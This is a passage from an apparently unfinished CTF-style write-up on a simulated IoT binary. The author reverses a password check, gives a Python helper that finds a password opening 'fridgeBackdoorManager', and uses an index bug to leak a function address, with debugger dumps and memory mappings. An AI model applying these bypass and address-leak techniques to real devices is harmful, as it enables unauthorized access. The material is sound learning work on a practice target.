+0x1085:  shl     qword [rbp-0x48], 0x1
+0x1089:  add     dword [rbp-0x4c], 0x1
+0x108d:  mov     eax, dword [rbp-0x4c]
+0x1090:  movsxd  rbx, eax
+0x1093:  lea     rax, [rbp-0x40]
+0x1097:  mov     rdi, rax
+0x109a:  call    strlen
+0x109f:  cmp     rbx, rax
+0x10a2:  jb      0x1065
+0x10a4:  jmp     0x10a7
+0x10a6:  nop     
+0x10a7:  cmp     qword [rbp-0x48], 0x2d64a
+0x10af:  je      0x10c9
+0x10b1:  lea     rdi, [rel data_2593]  &#34;[31;1m!! BAD PASSWORD!![0m&#34;
+0x10b8:  call    puts
+0x10bd:  mov     edi, 0x1
+0x10c2:  call    sleep
+0x10c7:  jmp     0x10d3
+0x10c9:  mov     eax, 0x0
+0x10ce:  call    fridgeBackdoorManager
+0x10d3:  mov     rax, qword [rbp-0x18]
+0x10d7:  xor     rax, qword [fs:0x28]
+0x10e0:  je      0x10e7
+0x10e2:  call    __stack_chk_fail
+0x10e7:  add     rsp, 0x48
+0x10eb:  pop     rbx
+0x10ec:  pop     rbp
+0x10ed:  retn    
+</code></pre><p>The main task here was to find a number of bytes that when added and left shifted by 1 resulted in <code>0x2d64a</code>. I created a python program to mimic the assembly code and made it print out the output for every byte it processes.</p>
+<p>To find the bytes that resulted in <code>0x2d64</code>, I mainly picked some numbers of my choice and changed them around until the <code>total</code> was <code>0x2d64</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>total <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x7</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> password:
+</span></span><span style="display:flex;"><span>    signed <span style="color:#f92672">=</span> character <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x100</span> <span style="color:#66d9ef">if</span> character <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x80</span> <span style="color:#66d9ef">else</span> character
+</span></span><span style="display:flex;"><span>    total <span style="color:#f92672">+=</span> signed
+</span></span><span style="display:flex;"><span>    total <span style="color:#f92672">=</span> total <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Hex: &#34;</span>, hex(total), <span style="color:#e6db74">&#34; Number: &#34;</span>, total)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(total <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x2d64a</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>After gaining access to the <code>fridgeBackdoorManager</code> I turned off the fridge circuit by cutting off the power. This allowed me to interact with other devices. The next device I interacted with was the light bulb since there was another potential vulnerability there of my interest. Since the circuit is not overloaded we can toggle the lightbulb and use it for potential exploitation.</p>
+<p>I started by looking at (insert potential issue number here) to see if I could get any memory leaks. I used the logic bug stated in this issue to get an address leak. I made the program set the <code>color</code> to the 11th index which held the memory address of <code>lightbulb.toggle</code> and then printed it out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.-----------------------------------.
+</span></span><span style="display:flex;"><span>| Colormatic |  Home  | <span style="color:#f92672">[</span>Settings<span style="color:#f92672">]</span>  |
+</span></span><span style="display:flex;"><span>| --------------------------------- |
+</span></span><span style="display:flex;"><span>| Menu:                             |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> Set Directly                 |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> Use Favorite                 |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;-----------------------------------&#39;</span>
+</span></span><span style="display:flex;"><span>Enter Choice:
+</span></span><span style="display:flex;"><span>&gt;&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>Enter favorite number:
+</span></span><span style="display:flex;"><span>&gt;&gt; <span style="color:#ae81ff">11</span>
+</span></span><span style="display:flex;"><span>.-----------------------------------.
+</span></span><span style="display:flex;"><span>| Colormatic | <span style="color:#f92672">[</span> Home <span style="color:#f92672">]</span> | Settings  |
+</span></span><span style="display:flex;"><span>| --------------------------------- |
+</span></span><span style="display:flex;"><span>| Menu:                             |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> Print Status                 |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> Set Color                    |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>3<span style="color:#f92672">]</span> Add Favorite Color           |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> Toggle Light                 |
+</span></span><span style="display:flex;"><span>|  <span style="color:#f92672">[</span>5<span style="color:#f92672">]</span> Quit                         |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;-----------------------------------&#39;</span>
+</span></span><span style="display:flex;"><span>Enter Choice:
+</span></span><span style="display:flex;"><span>&gt;&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">\ </span>  ..---..  /      
+</span></span><span style="display:flex;"><span>    .    /       <span style="color:#ae81ff">\ </span>  .    
+</span></span><span style="display:flex;"><span>    --  |         |   --  
+</span></span><span style="display:flex;"><span>  -     :         ;    -  
+</span></span><span style="display:flex;"><span>  .  /   <span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\~</span>/  /  <span style="color:#ae81ff">\ </span>    
+</span></span><span style="display:flex;"><span>      /   <span style="color:#e6db74">`</span>, Y ,<span style="color:#e6db74">&#39;   ,  .  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /    ,  |_|_|  \  .    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           |===|          
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           |===|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            \_/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Light Is On. Color is #005567
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.-----------------------------------.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Colormatic | [ Home ] | Settings  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| --------------------------------- |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Menu:                             |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  [1] Print Status                 |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  [2] Set Color                    |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  [3] Add Favorite Color           |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  [4] Toggle Light                 |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  [5] Quit                         |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>-----------------------------------<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>Enter Choice:
+</span></span></code></pre></div><p>This program allowed me to set the</p>
+<p>Started &lsquo;p1_iot&rsquo;
+Segmentation Fault
+rax: 0x0000000000000000
+rbx: 0x0000000000000000
+rcx: 0x00000000ffffffda
+rdx: 0x000055aa692111ab
+rsi: 0x0000000000000004
+rdi: 0x00007ffe8f01ad41
+rbp: 0x00007ffe8f01adb0
+rsp: 0x00007ffe8f01ad28
+rip: 0x000055aa69219678
+r8:  0x0000000000000000
+r9:  0x1999999999999999
+r10: 0x0000000000000000
+r11: 0x00007f55140635e0
+r12: 0x000055aa69218b70
+r13: 0x00007ffe8f01aec0
+r14: 0x0000000000000000
+r15: 0x0000000000000000
+fs:  0x0000000000000000
+gs:  0x0000000000000000
+eflags: 0x0000000000000044
+wdb&gt; info proc mappings
+0x55aa69218000-0x55aa6921c000 r-x p1_iot
+0x55aa6941b000-0x55aa6941c000 r&ndash; p1_iot
+0x55aa6941c000-0x55aa6941d000 rw- p1_iot
+0x55aa6ac57000-0x55aa6ac79000 rw- [brk]
+0x7f5513cc4000-0x7f5513cea000 r-x ld-2.23.so
+0x7f5513cea000-0x7f5513ceb000 rw-
+0x7f5513ceb000-0x7f5513cec000 rw-
+0x7f5513ee9000-0x7f5513eea000 r&ndash; ld-2.23.so
+0x7f5513eea000-0x7f5513eec000 rw- ld-2.23.so
+0x7f5513eec000-0x7f5513fb8000 r-x libc.so.6
+0x7f5513fb8000-0x7f5513fb9000 r-x libc.so.6
+0x7f5513fb9000-0x7f55140ac000 r-x libc.so.6
+0x7f55140ac000-0x7f55142ac000 &mdash; libc.so.6
+0x7f55142ac000-0x7f55142b0000 r&ndash; libc.so.6
+0x7f55142b0000-0x7f55142b2000 rw- libc.so.6
+0x7f55142b2000-0x7f55142b6000 rw-
+0x7ffe8effa000-0x7ffe8f01b000 rw- [stack]
+wdb&gt; disassemble printAlarmPassword
+0x11ab &lt;+0&gt;:    push    rbp
+0x11ac &lt;+1&gt;:    mov     rbp, rsp
+0x11af &lt;+4&gt;:    lea     rdi, [rel 0x25e3]  &ldquo;.&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;.&rdquo;
+0x11b6 &lt;+11&gt;:   call    0xa80 <!-- raw HTML omitted -->
+0x11bb &lt;+16&gt;:   lea     rdi, [rel 0x2601]  &ldquo;| Current Password:  |&rdquo;
+0x11c2 &lt;+23&gt;:   call    0xa80 <!-- raw HTML omitted -->
+0x11c7 &lt;+28&gt;:   mov     rax, qword [rel 0x204100]
+0x11ce &lt;+35&gt;:   mov     rsi, rax
+0x11d1 &lt;+38&gt;:   lea     rdi, [rel 0x261f]  &ldquo;|    %08lx    |\n&rdquo;
+0x11d8 &lt;+45&gt;:   mov     eax, 0x0
+0x11dd &lt;+50&gt;:   call    0xab0 <!-- raw HTML omitted -->
+0x11e2 &lt;+55&gt;:   lea     rdi, [rel 0x2638]  &ldquo;&rsquo;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&lsquo;[0…&rdquo;
+0x11e9 &lt;+62&gt;:   call    0xa80 <!-- raw HTML omitted -->
+0x11ee &lt;+67&gt;:   nop  <br>
+0x11ef &lt;+68&gt;:   pop     rbp
+0x11f0 &lt;+69&gt;:   retn <br>
+wdb&gt; print printAlarmPassword
+$1 = 0x55aa692191ab
+wdb&gt; 0x55aa69219359</p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2025  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
